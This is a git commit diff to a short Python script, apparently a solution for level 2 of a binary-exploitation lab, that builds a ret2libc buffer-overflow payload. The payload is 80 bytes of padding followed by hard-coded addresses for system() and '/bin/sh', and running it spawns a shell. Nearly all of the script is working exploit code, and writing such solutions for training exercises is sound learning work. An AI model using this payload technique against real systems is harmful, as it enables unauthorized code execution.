ea56ddeab5cb50e5db4b39d2c830369d88dbdfc2
aallali <hi@allali.me>
2022-09-09 22:26:31 +0100

    [update] level2 some description : not complete

--- level2/script.py
+++ level2/script.py
@@ -1,15 +1,21 @@
 import struct
 
 # buffer overflow offset is 80
+
+
+# p()    return_adress = 0x0804853e
+# main() return_adress = 0x0804854b
+
 padding = "\x90" * 80
-
-p_return_adress = 0x0804853e
-main_return_adress = 0x0804854b
-
-ret_adress = str(struct.pack("I", p_return_adress))
+ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
 system = str(struct.pack("I", 0xb7e6b060))
 returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0))
 bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh
 
 payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
+#          80     +     4      +    4   +         4         +   4 
 print(payload)
+
+
+
+padding + 0xbffff700 + \xCC * 4
